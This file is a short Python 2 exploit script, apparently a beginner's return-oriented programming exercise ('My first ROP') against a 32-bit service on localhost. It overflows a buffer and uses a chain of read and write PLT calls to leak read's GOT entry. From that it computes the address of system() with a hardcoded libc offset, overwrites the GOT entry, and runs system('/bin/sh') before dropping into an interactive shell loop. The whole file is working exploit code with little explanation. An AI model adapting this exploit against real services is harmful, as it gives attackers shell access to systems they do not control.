import struct
from socket import *
from time import *

### My first ROP

s = socket(AF_INET, SOCK_STREAM, 0)
s.connect(('localhost', 1234))


p = lambda x:struct.pack("<L", x)
up = lambda x:struct.unpack("<L", x)[0]



readplt = 0x0804832c
writeplt = 0x0804830c
readgot = 0x0804961c

popret = 0x080484b6
binshaddr = 0x08049530
systemoffset = 0x99a10

binsh = "/bin/sh"
lenbinsh = len(binsh)

pay = "A"*140

# input "/bin/sh" to space(binshaddr)
# read(0, space, len("/bin/sh"))
pay += p(readplt)
pay += p(popret)
pay += p(0)
pay += p(binshaddr)
pay += p(lenbinsh)


# send read@got's address for calculate system's address
# write(1, read@got, len(read@got))
pay += p(writeplt)
pay += p(popret)
pay += p(1)
pay += p(readgot)
pay += p(4)

# write calculated system's address
# read(0, read@got, len(read@got))
pay += p(readplt)
pay += p(popret)
pay += p(0)
pay += p(readgot)
pay += p(4)

# call read function, but It will call system("/bin/sh")
# read(space)
pay += p(readplt)
pay += "AAAA"
pay += p(binshaddr)


# send payload & send "/bin/sh" & wait 1 sec
s.send(pay)
sleep(1)
s.send(binsh)
sleep(1)
print("send payload")

# read read@got's address
read = up(s.recv(4))
print("read@got is on " + hex(read))

system = read - systemoffset
print("system is on " + hex(system))

s.send(p(system))
while True:
	s.send(raw_input("> ") + "\n")
	print(s.recv(4096))
